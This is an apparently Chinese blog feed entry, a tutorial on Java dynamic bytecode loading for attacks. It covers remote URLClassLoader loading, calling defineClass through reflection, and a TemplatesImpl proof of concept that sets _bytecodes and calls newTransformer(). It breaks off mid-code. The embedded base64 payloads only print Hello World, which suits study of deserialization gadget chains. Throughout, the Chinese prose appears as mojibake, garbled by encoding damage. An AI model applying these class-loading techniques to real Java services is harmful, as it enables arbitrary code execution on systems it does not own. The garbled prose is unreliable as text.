(gitbook.io)</a></p><p><a href="http://ww25.yongsheng.site/2022/07/18/JNDI-attack/?subid1=20240730-2329-3605-89e6-4e26b297e35b">yongsheng.site</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb-åŠ¨æ€åŠ è½½å­—èŠ‚ç </title>
    <link href="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡ç»­ä¸ŠCC3é‡Œæ²¡è®²å®Œçš„åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚</p><h2 id="åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹classæ–‡ä»¶"><a href="#åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹classæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹classæ–‡ä»¶"></a>åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹classæ–‡ä»¶</h2><p>Javaçš„<code>ClassLoader</code>æ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ã€‚</p><p>å­¦åˆ°è¿™é‡Œï¼ŒçŸ¥é“åå°„çš„äººåº”è¯¥ä¹Ÿå¾ˆæ¸…æ¥šï¼Œ<code>ClassLoader</code>å°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚Javaé»˜è®¤çš„<code>ClassLoader</code>å°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚ <code>java.lang.Runtime</code> ã€‚</p><p><code>ClassLoader</code>çš„æ¦‚å¿µçš„ç¡®å¾ˆå®½æ³›ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿä¸åšæ·±å…¥åˆ†æï¼Œè¿™é‡Œè¦è¯´åˆ°çš„æ˜¯è¿™ä¸ª </p><p><code>ClassLoader</code>ï¼š <code>URLClassLoader</code> </p><p><code>URLClassLoader</code>å®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„<code>AppClassLoader</code>çš„çˆ¶ç±»ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è§£é‡Š<code>URLClassLoader</code>çš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„Javaç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚ </p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹<code>sun.boot.class.path</code>å’Œ<code>java.class.path</code>ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„<code>java.net.URL</code>ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ã€‚</p><p>è€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·URLæœªä»¥æ–œæ /ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨JarLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶ <br>Â·URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åæ˜¯fileï¼Œåˆ™ä½¿ç”¨FileLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶<br>Â·URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯fileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„Loaderæ¥å¯»æ‰¾ç±» <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ­£å¸¸å¼€å‘çš„æ—¶å€™é€šå¸¸é‡åˆ°çš„æ˜¯å‰ä¸¤è€…ï¼Œé‚£ä»€ä¹ˆæ—¶å€™æ‰ä¼šå‡ºç°ä½¿ç”¨Loaderå¯»æ‰¾ç±»çš„æƒ…å†µå‘¢ï¼Ÿ</p><p>å½“ç„¶æ˜¯éfileåè®®çš„æƒ…å†µä¸‹ï¼Œæœ€å¸¸è§çš„å°±æ˜¯<strong>httpåè®®</strong>ã€‚</p><p>HTTPå°æµ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªç®€å•çš„HelloWorldç¨‹åºï¼Œæ”¾åœ¨<a href="http://localhost:8000/Hello.class%EF%BC%9A">http://localhost:8000/Hello.classï¼š</a></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003225504.png" alt="image-20240730003225504"></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003325045.png" alt="image-20240730003325045"></p><p>æˆåŠŸè¯·æ±‚åˆ°æˆ‘ä»¬çš„<code>/Hello.class</code>æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å­—èŠ‚ç ï¼Œè¾“å‡ºâ€Hello Worldâ€ã€‚</p><p>æ‰€ä»¥ï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡<code>Java ClassLoader</code>çš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥<strong>åˆ©ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç </strong>äº†ã€‚</p><h2 id="åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </h2><p>å…¶å®ä¸ç®¡æ˜¯åŠ  è½½è¿œç¨‹classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„classæˆ–jaræ–‡ä»¶ï¼ŒJavaéƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730002859489.png" alt="image-20240730002859489"></p><p>å…¶ä¸­ï¼š </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·loadClass çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClass <br>Â·findClass çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ defineClass <br>Â·defineClass çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯è§ï¼ŒçœŸæ­£æ ¸å¿ƒçš„éƒ¨åˆ†å…¶å®æ˜¯ <code>defineClass</code> ï¼Œä»–å†³å®šäº†å¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJava é»˜è®¤çš„ <code>ClassLoader#defineClass</code> æ˜¯ä¸€ä¸ª<code>native</code>æ–¹æ³•ï¼Œé€»è¾‘åœ¨JVMçš„Cè¯­è¨€ä»£ç ä¸­ã€‚ </p><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„ä»£ç ï¼Œæ¥æ¼”ç¤ºå¦‚ä½•è®©ç³»ç»Ÿçš„ <code>defineClass</code> æ¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨ <code>defineClass</code> è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚</p><p>è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„<code>static</code>å—ä¸­ï¼Œåœ¨ <code>defineClass</code> æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚</p><p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨<code>defineClass</code>åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚  </p><p>æ‰§è¡Œä¸Šè¿°exampleï¼Œè¾“å‡ºäº†Hello Worldï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003751282.png" alt="image-20240730003751282"></p><p>è¿™é‡Œï¼Œå› ä¸ºç³»ç»Ÿçš„<code>ClassLoader#defineClass</code>æ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œä¸å¾—ä¸ä½¿ç”¨åå°„çš„å½¢å¼æ¥è°ƒç”¨ã€‚ </p><p>åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸º<code>defineClass</code>æ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾<code>TemplatesImpl</code>çš„åŸºçŸ³ã€‚</p><h2 id="åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç </h2><p>é‡å¤´æˆæ¥äº†ã€‚</p><p>è™½ç„¶å¤§éƒ¨åˆ†ä¸Šå±‚å¼€å‘è€…ä¸ä¼šç›´æ¥ä½¿ç”¨åˆ°<code>defineClass</code>æ–¹æ³•ï¼Œä½†æ˜¯Javaåº•å±‚è¿˜æ˜¯æœ‰ä¸€äº›ç±»ç”¨åˆ°äº†å®ƒï¼ˆå¦åˆ™ä»–ä¹Ÿæ²¡å­˜åœ¨çš„ä»·å€¼äº†ï¼‰ï¼Œè¿™å°±æ˜¯<code>TemplatesImpl</code>ã€‚ </p><p>å¼•å…¥ä¸€ä¸ªç©æ„ï¼š</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>è¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»:</p><p><code>TransletClassLoader</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br>    TransletClassLoader(ClassLoader parent) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-literal">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-literal">null</span>) &#123;<br>            ret = <span class="hljs-built_in">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>     Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»é‡Œé‡å†™äº†<code>defineClass</code>æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚</p><p>Javaä¸­é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸º<code>default</code>ã€‚</p><p>æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„<code>defineClass</code>ç”±å…¶çˆ¶ç±»çš„<code>protected</code>ç±»å‹å˜æˆäº†ä¸€ä¸ª<code>default</code>ç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚</p><p>æˆ‘ä»¬ä»<code>TransletClassLoader#defineClass()</code>å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; <br>TemplatesImpl#newTransformer() -&gt; <br>TemplatesImpl#getTransletInstance() -&gt; <br>TemplatesImpl#defineTransletClasses() -&gt; <br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>è¿½åˆ°æœ€å‰é¢ä¸¤ä¸ªæ–¹æ³•<code>TemplatesImpl#getOutputProperties()</code>ã€ <code>TemplatesImpl#newTransformer()</code>ï¼Œè¿™ä¸¤è€…çš„ä½œç”¨åŸŸæ˜¯<code>public</code>ï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ã€‚æˆ‘ä»¬å°è¯•ç”¨ <code>newTransformer()</code>æ„é€ ä¸€ä¸ªç®€å•çš„POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>    <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <br>    obj.newTransformer();<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>setFieldValue</code>æ–¹æ³•ç”¨æ¥è®¾ç½®ç§æœ‰å±æ€§ï¼Œå¯è§è¿™é‡Œè®¾ç½®äº†ä¸‰ä¸ªå±æ€§ï¼š</p><p><code>_bytecodes</code>ã€<code>_name</code> å’Œ<code>_tfactory</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·_bytecodesæ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ï¼›<br><br>Â·_nameå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œåªè¦ä¸ä¸º<span class="hljs-literal">null</span>å³å¯ï¼›<br><br>Â·_tfactoryéœ€è¦æ˜¯ä¸€ä¸ªTransformerFactoryImplå¯¹è±¡ï¼Œå› ä¸º TemplatesImpl#defineTransletClasses()æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ°_tfactory.getExternalExtensionsMap()ï¼Œå¦‚æœæ˜¯<span class="hljs-literal">null</span>ä¼šå‡ºé”™ã€‚ <br></code></pre></td></tr></table></figure><p>å¦å¤–å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>TemplatesImpl</code>ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼š</p><p>è¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>çš„å­ç±»ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplatesImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <br><span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloTemplatesImpl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        